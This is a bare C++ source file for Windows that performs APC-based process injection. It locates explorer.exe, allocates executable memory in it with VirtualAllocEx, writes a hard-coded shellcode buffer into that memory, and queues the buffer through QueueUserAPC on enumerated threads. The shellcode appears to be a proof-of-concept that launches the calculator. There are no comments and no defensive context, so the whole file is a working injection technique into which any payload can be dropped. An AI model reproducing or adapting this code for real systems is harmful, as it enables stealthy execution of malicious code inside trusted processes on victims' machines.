#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
int main()
{
    unsigned char ShellCocde[] = "\x50\x51\x52\x53\x56\x57\x55\x54\x58\x66\x83\xe4\xf0\x50\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5c\x5d\x5f\x5e\x5b\x5a\x59\x58\xc3";
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
    SIZE_T ulen = sizeof(ShellCocde)/sizeof(char);
    HANDLE threadHandle = NULL;
    if (Process32First(hSnapshot, &pe32)) {
        while (lstrcmp(pe32.szExeFile, L"explorer.exe") != 0) {
            Process32Next(hSnapshot, &pe32);
        }
    }
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pe32.th32ProcessID);
    if (hProcess) {
        LPVOID lpShellAddress = VirtualAllocEx(hProcess, NULL, ulen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (lpShellAddress) {
            if (WriteProcessMemory(hProcess, lpShellAddress, ShellCocde, ulen, NULL)) {
                if (Thread32First(hSnapshot, &te32)) {
                    do {
                        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                        if (hThread) {
                            QueueUserAPC((PAPCFUNC)lpShellAddress, hThread, NULL);
                            Sleep(1000);
                        }
                    } while (Thread32Next(hSnapshot, &te32));
                }
            }

        }

    }
    

    return 0;
}